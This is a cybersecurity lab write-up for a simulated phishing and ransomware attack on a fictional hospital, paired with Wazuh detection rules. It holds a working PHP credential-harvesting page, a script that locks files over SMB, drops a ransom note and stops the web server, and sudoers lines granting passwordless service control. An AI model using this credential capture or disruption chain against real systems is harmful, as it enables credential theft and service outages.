# Ransomware Simulation Complete Write-Up
## St. Hera's Hospital — Phishing Ransomware Simulation
### CyberLab Capstone Project


---


## Overview


This document covers the complete automated ransomware simulation
built for the St. Hera's Hospital capstone project. When a victim
submits credentials through the phishing portal, the entire attack
chain fires automatically — files get locked, a ransom note is
delivered, and the hospital portal goes completely dark.


**All files, accounts, and data are fictional. Lab environment only.**


---


## How It Works — The Full Automated Kill Chain


```
1. Nurse opens phishing email at stherashospital.org
2. Clicks "Verify Account Credentials"
3. Enters username and password
4. login.php captures credentials to creds.txt
5. login.php writes to access.log
6. Watcher detects "Credential submission" in access.log
7. Watcher fires ransomware_sim.py as root
8. ransomware_sim.py connects to Windows SMB
9. Renames demo_file1.txt → demo_file1.txt.locked
10. Renames demo_file2.txt → demo_file2.txt.locked
11. Renames demo_file3.txt → demo_file3.txt.locked
12. Uploads ransom_note.txt to RansomwareDemo share
13. Waits 10 seconds (victim sees dashboard)
14. Stops Apache — hospital portal goes dark
15. Wazuh detects everything and fires alerts
```


---


## File Structure


```
/opt/ransomware-sim/
├── ransomware_sim.py    Main simulator - locks files, delivers note, stops Apache
├── start.sh             Wrapper with killswitch safety check
├── watcher.sh           Monitors access.log and triggers simulation
├── restore.sh           Restores files and brings Apache back online
├── ransom_note.txt      The ransom note delivered to Windows
└── wrapper.log          Full execution log


/var/www/html/heras/
└── login.php            Captures credentials and writes to access.log


/var/www/logs/
├── creds.txt            Captured credentials (timestamp, IP, user, pass, agent)
└── access.log           Apache access log monitored by watcher
```


---


## Part 1 — File Setup on Kali


### Create the directory:
```bash
sudo mkdir -p /opt/ransomware-sim
sudo chmod 777 /opt/ransomware-sim/
```


### Create the ransom note:
```bash
nano /opt/ransomware-sim/ransom_note.txt
```


Paste:
```
YOUR FILES HAVE BEEN ENCRYPTED


All patient records on this system have been locked using
military-grade encryption.


To restore access you must pay 50 Bitcoin to the following address:
[SIMULATED ADDRESS - LAB DEMO ONLY]


You have 72 hours to comply. After that the decryption key
will be permanently destroyed.


Do not attempt to restore files yourself. Any tampering will
result in permanent data loss.


Contact: decrypt@darkweb.onion


-- THIS IS A SIMULATED RANSOM NOTE FOR EDUCATIONAL PURPOSES --
```


---


## Part 2 — ransomware_sim.py


Save at `/opt/ransomware-sim/ransomware_sim.py`:


```bash
sudo nano /opt/ransomware-sim/ransomware_sim.py
```


```python
#!/usr/bin/env python3
"""
Heras Revenge - Ransomware Simulator
St. Hera's Hospital - CyberLab Capstone Project
Safe training script for controlled cybersecurity labs only.
No real encryption is performed - files are renamed only.
"""


import subprocess
import sys
import os
import time
import logging
from datetime import datetime


# ============================================================
# Configuration - Update these for your lab
# ============================================================
WINDOWS_IP       = "192.168.0.236"
SMB_SHARE        = "RansomwareDemo"
SMB_USER         = "n.rivera"
SMB_PASS         = "Summer2026!"
RANSOM_NOTE_PATH = "/opt/ransomware-sim/ransom_note.txt"
LOG_FILE         = "/opt/ransomware-sim/wrapper.log"
DEMO_FILES       = [
    "demo_file1.txt",
    "demo_file2.txt",
    "demo_file3.txt"
]


# ============================================================
# Logging setup
# ============================================================
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [ransomware_sim] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)


def log(msg):
    logging.info(msg)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}")


def simulate_ransomware():
    """Rename demo files to .locked and drop ransom note."""
    log("Starting ransomware simulation...")


    # Step 1 - Rename files to .locked one at a time
    for f in DEMO_FILES:
        log(f"Renaming: {f} -> {f}.locked")
        cmd = f'rename "{f}" "{f}.locked"'
        result = subprocess.run(
            f'/usr/bin/smbclient //{WINDOWS_IP}/{SMB_SHARE} -U {SMB_USER}%{SMB_PASS} -c \'{cmd}\'',
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            log(f"Successfully renamed {f}")
        else:
            log(f"Error renaming {f}: {result.stderr}")


    # Step 2 - Upload ransom note
    if os.path.exists(RANSOM_NOTE_PATH):
        result = subprocess.run(
            f'/usr/bin/smbclient //{WINDOWS_IP}/{SMB_SHARE} -U {SMB_USER}%{SMB_PASS} -c \'put "{RANSOM_NOTE_PATH}" "ransom_note.txt"\'',
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            log("Ransom note uploaded successfully.")
        else:
            log(f"Ransom note upload error: {result.stderr}")
    else:
        log(f"WARNING: Ransom note not found at {RANSOM_NOTE_PATH}")


    # Step 3 - Wait so victim sees dashboard before lockdown
    log("Waiting 10 seconds before hospital portal lockdown...")
    time.sleep(10)


    # Step 4 - Stop Apache to simulate full hospital lockdown
    log("Stopping Apache - simulating hospital portal lockdown...")
    result = subprocess.run(
        ["sudo", "systemctl", "stop", "apache2"],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        log("Apache stopped - hospital portal is now unreachable.")
    else:
        log(f"Apache stop error: {result.stderr}")


    log("Ransomware simulation complete.")


def restore():
    """Restore demo files and restart Apache."""
    log("Starting restore...")


    # Step 1 - Rename .locked files back to .txt one at a time
    for f in DEMO_FILES:
        log(f"Restoring: {f}.locked -> {f}")
        cmd = f'rename "{f}.locked" "{f}"'
        result = subprocess.run(
            f'/usr/bin/smbclient //{WINDOWS_IP}/{SMB_SHARE} -U {SMB_USER}%{SMB_PASS} -c \'{cmd}\'',
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            log(f"Successfully restored {f}")
        else:
            log(f"Error restoring {f}: {result.stderr}")


    # Step 2 - Remove ransom note
    result = subprocess.run(
        f'/usr/bin/smbclient //{WINDOWS_IP}/{SMB_SHARE} -U {SMB_USER}%{SMB_PASS} -c \'del "ransom_note.txt"\'',
        shell=True,
        capture_output=True,
        text=True
    )
    if result.returncode == 0:
        log("Ransom note removed.")
    else:
        log(f"Ransom note removal error: {result.stderr}")


    # Step 3 - Restart Apache
    log("Starting Apache - restoring hospital portal...")
    result = subprocess.run(
        ["sudo", "systemctl", "start", "apache2"],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        log("Apache started - hospital portal is back online.")
    else:
        log(f"Apache start error: {result.stderr}")


    log("Restore complete.")


# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    if "--restore" in sys.argv:
        restore()
    else:
        simulate_ransomware()
```


Make executable:
```bash
sudo chmod +x /opt/ransomware-sim/ransomware_sim.py
```


---


## Part 3 — start.sh (Wrapper with Killswitch)


```bash
sudo nano /opt/ransomware-sim/start.sh
```


```bash
#!/bin/bash


# ============================================================
#  Heras Revenge - Ransomware Simulator Wrapper
#  Safe training script for controlled cybersecurity labs
# ============================================================


SIMULATOR="/opt/ransomware-sim/ransomware_sim.py"
LOGFILE="/opt/ransomware-sim/wrapper.log"
KILLSWITCH="/opt/ransomware-sim/KILL"


timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}


echo "[$(timestamp)] Wrapper invoked." >> "$LOGFILE"


# Check for killswitch - if KILL file exists abort immediately
if [ -f "$KILLSWITCH" ]; then
    echo "[$(timestamp)] Killswitch detected. Aborting." >> "$LOGFILE"
    exit 0
fi


# Verify simulator exists
if [ ! -f "$SIMULATOR" ]; then
    echo "[$(timestamp)] ERROR: Simulator not found." >> "$LOGFILE"
    exit 1
fi


# Execute simulator
echo "[$(timestamp)] Executing ransomware simulator..." >> "$LOGFILE"
python3 "$SIMULATOR"


echo "[$(timestamp)] Simulator execution complete." >> "$LOGFILE"
exit 0
```


Make executable:
```bash
sudo chmod +x /opt/ransomware-sim/start.sh
```


---


## Part 4 — watcher.sh (Access Log Monitor)


This is the key piece — it monitors the Apache access log and
triggers the simulation automatically when credentials are submitted.


```bash
sudo nano /opt/ransomware-sim/watcher.sh
```


```bash
#!/bin/bash
# Monitors Apache access log for credential submissions
# and triggers ransomware simulation automatically


LOG="/opt/ransomware-sim/wrapper.log"
ACCESSLOG="/var/www/logs/access.log"


echo "[$(date)] Watcher started." >> "$LOG"


# Start from current file size - ignore existing entries
LASTSIZE=$(wc -c < "$ACCESSLOG" 2>/dev/null || echo 0)


while true; do
    CURRENTSIZE=$(wc -c < "$ACCESSLOG" 2>/dev/null || echo 0)
    if [ "$CURRENTSIZE" -gt "$LASTSIZE" ]; then
        NEWCONTENT=$(tail -c +$((LASTSIZE + 1)) "$ACCESSLOG")
        if echo "$NEWCONTENT" | grep -q "Credential submission"; then
            echo "[$(date)] NEW credential submission detected - firing simulation!" >> "$LOG"
            python3 /opt/ransomware-sim/ransomware_sim.py
        fi
        LASTSIZE=$CURRENTSIZE
    fi
    sleep 1
done
```


Make executable:
```bash
sudo chmod +x /opt/ransomware-sim/watcher.sh
```


---


## Part 5 — restore.sh


```bash
sudo nano /opt/ransomware-sim/restore.sh
```


```bash
#!/bin/bash


# ============================================================
#  Heras Revenge - Restore Wrapper
#  Restores demo files and brings Apache back online
# ============================================================


SIMULATOR="/opt/ransomware-sim/ransomware_sim.py"
LOGFILE="/opt/ransomware-sim/wrapper.log"


echo "[$(date +"%Y-%m-%d %H:%M:%S")] Restore invoked." >> "$LOGFILE"
python3 "$SIMULATOR" --restore
echo "[$(date +"%Y-%m-%d %H:%M:%S")] Restore complete." >> "$LOGFILE"
```


Make executable:
```bash
sudo chmod +x /opt/ransomware-sim/restore.sh
```


---


## Part 6 — login.php


This is the complete login.php that captures credentials and
writes to the access log which the watcher monitors:


```bash
nano /var/www/html/heras/login.php
```


```php
<?php
// St. Hera's Hospital - Phishing Simulation Credential Capture
// Lab-only proof of concept for capstone project.
date_default_timezone_set('UTC');


$user  = isset($_POST['username']) ? $_POST['username'] : '';
$pass  = isset($_POST['password']) ? $_POST['password'] : '';
$ip    = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$time  = date("Y-m-d H:i:s");


// Log captured credentials
$cred_entry   = "[$time] IP: $ip | USER: $user | PASS: $pass | AGENT: $agent\n";
$access_entry = "[$time] Credential submission from $ip\n";


file_put_contents("/var/www/logs/creds.txt",  $cred_entry,   FILE_APPEND);
file_put_contents("/var/www/logs/access.log", $access_entry, FILE_APPEND);


// Redirect victim to verified success page
header("Location: updated.html");
exit();
?>
```


---


## Part 7 — sudoers for Apache


Allow Apache to stop/start without password:
```bash
sudo visudo
```


Add at the bottom:
```
www-data ALL=(ALL) NOPASSWD: /bin/systemctl stop apache2, /bin/systemctl start apache2
www-data ALL=(ALL) NOPASSWD: /bin/bash /opt/ransomware-sim/start.sh
```


---


## Part 8 — Running the Demo


### Before each demo run:


**On Kali — clear logs:**
```bash
> /var/www/logs/creds.txt
> /var/www/logs/access.log
> /opt/ransomware-sim/wrapper.log
```


**On Windows — restore demo files:**
```powershell
Remove-Item "C:\Users\n.rivera\Desktop\RansomwareDemo\*.locked" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Users\n.rivera\Desktop\RansomwareDemo\ransom_note.txt" -Force -ErrorAction SilentlyContinue
"Disposable demo file 1" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file1.txt"
"Disposable demo file 2" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file2.txt"
"Disposable demo file 3" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file3.txt"
```


### Start the watcher on Kali:
```bash
sudo bash /opt/ransomware-sim/watcher.sh
```


### Run the demo from Windows browser:
```
http://stherashospital.org/email.html
```


### What the audience sees:
1. Phishing email in fake Outlook inbox
2. Clicks verify credentials button
3. Enters n.rivera / Summer2026!
4. Sees "Account Verified" success page
5. Redirected to St. Hera's Hospital dashboard
6. 10 seconds later — site goes completely dark
7. Hospital is locked down


### What shows on Kali watcher terminal:
```
Watcher started.
NEW credential submission detected - firing simulation!
Starting ransomware simulation...
Renaming: demo_file1.txt -> demo_file1.txt.locked
Successfully renamed demo_file1.txt
Renaming: demo_file2.txt -> demo_file2.txt.locked
Successfully renamed demo_file2.txt
Renaming: demo_file3.txt -> demo_file3.txt.locked
Successfully renamed demo_file3.txt
Ransom note uploaded successfully.
Waiting 10 seconds before hospital portal lockdown...
Stopping Apache - simulating hospital portal lockdown...
Apache stopped - hospital portal is now unreachable.
Ransomware simulation complete.
```


---


## Part 9 — After the Demo (Restore Everything)


**On Kali run the restore script:**
```bash
sudo python3 /opt/ransomware-sim/ransomware_sim.py --restore
```


This automatically:
- Renames all .locked files back to .txt
- Removes the ransom note
- Starts Apache — portal back online


**Verify restore worked:**
```bash
curl http://stherashospital.org/email.html | head -5
```


Should return HTML content.


---


## Part 10 — Safety Features


**Killswitch** — create this file to prevent simulation from running:
```bash
sudo touch /opt/ransomware-sim/KILL
```


Remove to re-enable:
```bash
sudo rm /opt/ransomware-sim/KILL
```


**The simulation:**
- Only renames files — no real encryption
- Only touches RansomwareDemo folder — nothing else
- Completely reversible with restore script
- Logs every action to wrapper.log


---


## Part 11 — Wazuh Detection During Demo


When the simulation runs Wazuh fires these alerts:


| Rule | Alert | Level |
|---|---|---|
| 102 | SMB network logon detected | 4 |
| 106 | .locked file rename detected | 15 CRITICAL |
| 107 | Ransom note file detected | 15 CRITICAL |
| 112 | After hours SMB logon | 10 |
| 113 | Mass encryption detected | 15 CRITICAL |
| 100101 | Operation Code Blue SMB access | 8 |


**SOC Queue filter in Wazuh dashboard:**
```
rule.groups:soc_queue
```


---


## Lab Environment


| VM | Role | IP |
|---|---|---|
| Kali Linux | Attacker + Watcher | 192.168.0.218 |
| Windows Server | Victim + Wazuh Agent | 192.168.0.236 |
| Wazuh VM | SIEM Manager + Dashboard | 192.168.0.177 |
| Domain | Hospital Portal | stherashospital.org |


---





